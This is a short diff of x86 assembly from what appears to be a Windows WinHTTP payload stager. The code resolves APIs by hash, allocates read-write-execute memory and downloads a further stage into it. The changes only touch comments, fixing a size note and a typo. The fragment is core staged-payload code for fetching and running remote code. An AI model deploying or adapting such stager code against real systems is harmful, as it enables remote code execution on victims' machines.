@@ -8,7 +8,6 @@
   ;0x00000100  ; WINHTTP_FLAG_BYPASS_PROXY_CACHE
 
 ; Input: EBP must be the address of 'api_call'.
-; Output: EDI will be the socket for the connection to the server
 ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
 
 load_winhttp:
@@ -100,7 +99,7 @@ receive_response:
 allocate_memory:
   push byte 0x40         ; PAGE_EXECUTE_READWRITE
   push 0x1000            ; MEM_COMMIT
-  push 0x00400000        ; Stage allocation (8Mb ought to do us)
+  push 0x00400000        ; Stage allocation (4Mb ought to do us)
   push ebx               ; NULL as we dont care where the allocation is
   push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
   call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
@@ -119,7 +118,7 @@ download_more:
   push 0x7E24296C        ; hash( "winhttp.dll", "WinHttpReadData" )
   call ebp
 
-  test eax,eax           ; if ownload failed? (optional?)
+  test eax,eax           ; if download failed? (optional?)
   jz failure
 
   mov eax, [edi]
